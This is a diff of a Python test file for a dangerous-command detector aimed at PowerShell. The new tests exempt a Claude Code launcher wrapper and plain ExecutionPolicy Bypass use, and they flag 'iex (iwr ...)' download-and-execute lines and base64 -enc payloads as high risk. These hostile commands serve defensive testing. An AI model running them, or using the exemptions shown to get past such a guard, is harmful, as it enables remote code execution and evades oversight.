@@ -123,31 +123,39 @@ def test_powershell_encodedcommand_matches_high():
     assert matched[1] == "high"
 
 
-def test_powershell_executionpolicy_bypass_matches_high():
-    matched = is_dangerous_command(
-        "powershell.exe -ExecutionPolicy Bypass -File script.ps1", "powershell.exe",
-    )
+CLAUDE_CODE_WRAPPER = (
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -NonInteractive "
+    "-ExecutionPolicy Bypass -Command $__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; "
+    "$env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; Invoke-Expression -Command $__claudeCodeScript"
+)
+
+
+def test_claude_code_wrapper_does_not_match():
+    assert is_dangerous_command(CLAUDE_CODE_WRAPPER, "powershell.exe") is None
+
+
+def test_executionpolicy_bypass_alone_does_not_match():
+    assert is_dangerous_command("powershell.exe -ExecutionPolicy Bypass -File script.ps1", "powershell.exe") is None
+
+
+def test_command_flag_alone_does_not_match():
+    assert is_dangerous_command('pwsh -Command "Get-Process"', "pwsh") is None
+
+
+def test_iex_alone_does_not_match():
+    assert is_dangerous_command("powershell -c iex $x", "powershell") is None
+
+
+def test_powershell_iex_iwr_matches_high():
+    matched = is_dangerous_command("powershell -c iex (iwr http://x)", "powershell")
     assert matched is not None
     assert matched[1] == "high"
 
 
-def test_pwsh_command_flag_matches_high():
-    matched = is_dangerous_command('pwsh -Command "Get-Process"', "pwsh")
+def test_powershell_enc_base64_matches_high():
+    matched = is_dangerous_command("powershell -enc SQBFAFgAIAAoAGkAdwByACkA", "powershell")
     assert matched is not None
     assert matched[1] == "high"
-
-
-def test_literal_powershell_dash_command_string_is_not_required():
-    """The old implementation looked for the literal substring
-    "powershell -command" (bare word, no .exe, no path), which a real
-    invocation like "C:\\...\\powershell.exe -Command ..." never
-    actually contains. The exe-basename + flag check must match this
-    realistic form instead."""
-    matched = is_dangerous_command(
-        'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command "Remove-Item x"',
-        "powershell.exe",
-    )
-    assert matched is not None
 
 
 # ----------------------------------------------------------- bare exe tier
